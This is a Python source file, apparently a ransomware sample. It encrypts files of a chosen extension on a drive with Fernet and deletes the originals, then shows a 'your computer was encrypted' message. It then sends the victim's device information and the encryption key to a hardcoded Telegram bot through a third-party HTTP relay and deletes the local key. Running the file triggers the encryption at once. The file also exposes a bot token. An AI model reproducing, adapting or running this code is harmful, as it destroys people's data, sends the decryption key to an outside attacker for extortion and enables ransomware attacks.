# !!! Dangerous !!!

# https://github.com/MMErfani/
from subprocess import check_output
from cryptography.fernet import Fernet
import os
import platform
import requests

def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D"):
    if key == 1:  
        key = Fernet.generate_key()

    Encrypt = Fernet(key)

    key_file = open("key", "w")   
    key_file.write(str(key))      
    key_file.close()

    os_info = platform.uname()
    with open("device-info", "a") as device_info:
        device_info.truncate(0)
        for data in os_info:
            device_info.write(str(data) + "\n")
        device_info.close()
    

    try:
        cmd = check_output(f"{drive}: && cd test && dir /S /B *.{target_file_extention}", shell=True).decode().split() 

        for i in cmd:
            try:
                with open(i, "rb") as thisfile:
                    data = thisfile.read()
                    enc_data = Encrypt.encrypt(data)
                    new_file = open(i+f".{encrypted_file_extention}", "wb")
                    new_file.write(enc_data)
                    thisfile.close()
                    new_file.close()
                    os.remove(i)
                    print(i + "------------> " + "Encrypted")
            except:
                pass

        if platform.uname()[0] == "Windows":
            import win32api
            win32api.MessageBox(0, 'Part/All of your computer was encrypted!', 'Oh...!')

    except:
        pass

    try:
        with open("device-info", "r") as device_info:
            info = device_info.read()
            keyfile = open("key", "r")
            key = keyfile.read()
            url = ("https://api.telegram.org/bot5265148504:AAEYGDSA2cMi4Eq5XQyDPEwyeH7coIn6k9s/SendMessage?chat_id=1202560419&text="+str(info)+"\n"+str(key))

            payloud = {"UrlBox":url,
                        "AgentList":"Mozilla Firefox",
                        "VersionList":"HTTP/1.1",
                        "MethodList":"POST"
            }
            req = requests.post("HTTPS://WWW.httpdebugger.com/tools/ViewHttpHeaders.aspx",payloud)
            print(req)
            os.remove(os.getcwd()+"\device-info")
            os.remove(os.getcwd()+"\key")
    except: pass



def dec(encrypted_file_extention="maher", key=1, drive="D"):
    if key == 1:
        keyfile = open("key", "r")
        key = keyfile.read()
        key = b"%s" % bytes(key.split("'")[1].encode())
        print(key)


    
    Decrypt = Fernet(key)

    try:
        cmd = check_output(f"{drive}: && cd test && dir /S /B *.{encrypted_file_extention}", shell=True).decode().split()

        for i in cmd:
                try:
                    with open(i, "rb") as thisfile:
                        data = thisfile.read()
                        dec_data = Decrypt.decrypt(data)
                        new_file = open(i.replace(f".{encrypted_file_extention}", ""), "wb")
                        new_file.write(dec_data)
                        thisfile.close()
                        new_file.close()
                        os.remove(i)
                        print(i + "------------> " + "Decrypted")
                except:
                    pass
        try:
            if platform.uname()[0] == "Windows":
                import win32api
                win32api.MessageBox(0, 'Part/All of your computer was decrypted!', 'Oh...!')
        except: pass


    except:
        pass
enc("txt","maher",1,"f")
#dec(drive="f")


